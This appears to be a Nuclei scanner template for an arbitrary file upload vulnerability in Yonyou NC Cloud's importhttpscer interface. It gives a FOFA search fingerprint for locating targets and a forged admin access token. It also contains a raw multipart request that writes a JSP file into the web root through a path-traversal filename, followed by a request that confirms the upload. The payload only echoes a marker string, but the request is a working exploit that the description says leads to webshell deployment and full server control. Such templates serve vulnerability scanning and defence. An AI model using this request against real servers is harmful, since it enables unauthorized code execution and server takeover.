id: yongyouNC-Cloud-importhttpscer-File-upload

info:
  name: "用友NC Cloud importhttpscer接口任意文件上传漏洞"
  author: Unknown
  severity: high
  description: |-
    fofa: icon_hash="1596996317"
      用友NC Cloud系统importhttpscer接口未正确校验文件上传权限，导致攻击者可构造恶意请求上传任意文件。该缺陷允许攻击者部署WebShell实现远程代码执行，通过文件覆盖、路径穿越等技术手段突破安全防护机制，最终导致服务器系统权限被完全控制。
  reference:
  - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247488565&idx=1&sn=c1b0eb3b1f62080dacfa926b6db0fd86&chksm=c267a106f5102810dd289c96fbe0ecc1400f4d0e2351d0eac41901438ce218c3c758c3012943&token=2115358587&lang=zh_CN#rd
  tags: 用友

variables:
  username: "{{to_lower(rand_base(6))}}" #从可选字符集（默认为字母和数字）生成给定长度字符串的随机序列
flow: |
  http(1) && http(2)

http:
- raw:
  - |
    POST /nccloud/mob/pfxx/manualload/importhttpscer HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
    accessToken: eyJhbGciOiJIUzUxMiJ9.eyJwa19ncm91cCI6IjAwMDE2QTEwMDAwMDAwMDAwSkI2IiwiZGF0YXNvdXJjZSI6IjEiLCJsYW5nQ29kZSI6InpoIiwidXNlclR5cGUiOiIxIiwidXNlcmlkIjoiMSIsInVzZXJDb2RlIjoiYWRtaW4ifQ.XBnY1J3bVuDMYIfPPJXb2QC0Pdv9oSvyyJ57AQnmj4jLMjxLDjGSIECv2ZjH9DW5T0JrDM6UHF932F5Je6AGxA
    Content-Type: multipart/form-data; boundary=fd28cb44e829ed1c197ec3bc71748df0

    --fd28cb44e829ed1c197ec3bc71748df0
    Content-Disposition: form-data; name="file"; filename="./webapps/nc_web/{{username}}.jsp"

    <% out.println("pboyjnnrfipmplsukdeczudsefxmywe");%>
    --fd28cb44e829ed1c197ec3bc71748df0--
- raw:
  - |
    GET /{{username}}.jsp HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - 'pboyjnnrfipmplsukdeczudsefxmywe'
  - type: status
    status:
    - 200
